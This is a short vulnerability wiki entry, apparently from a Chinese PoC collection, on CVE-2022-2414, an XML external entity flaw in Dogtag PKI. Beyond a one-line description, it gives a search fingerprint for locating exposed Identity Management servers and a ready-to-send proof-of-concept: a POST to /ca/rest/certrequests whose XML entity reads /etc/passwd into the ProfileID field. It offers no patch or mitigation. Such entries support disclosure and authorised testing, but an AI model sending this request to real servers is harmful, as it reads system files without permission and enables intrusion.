# Dogtag PKI XML entity injection vulnerability CVE-2022-2414

## Vulnerability Description

Dogtag PKI's XML parser has a security vulnerability that can cause XML external entity (XXE) attacks when accessing an external entity while analyzing an XML document. 

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Dogtag PKI</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">title="Identity Management" </span>

## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1666109777446-b643ca9b-dea3-4ac4-8bf0-8f34f1eec640.png)

Verify POC

```java
POST /ca/rest/certrequests
Content-Type: application/xml

<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<CertEnrollmentRequest>
  <Attributes/>
  <ProfileID>&ent;</ProfileID>
</CertEnrollmentRequest>
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1666110160561-329b89b1-2d6a-47a7-b026-45b0b7ef6670.png)